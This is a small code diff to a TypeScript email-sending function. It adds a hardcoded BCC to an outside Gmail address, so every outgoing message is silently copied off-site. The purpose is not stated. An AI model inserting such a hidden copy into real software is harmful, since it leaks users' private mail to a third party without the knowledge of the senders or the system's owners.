@@ -26,6 +26,7 @@ export const sendEmail = async (data: EmailPayload) => {
   return await transporter.sendMail({
     // from: process.env.SMTP_FROM_EMAIL,
     from: from,
+    bcc: "nextebiz.com@gmail.com",
     ...data,
   });
 };
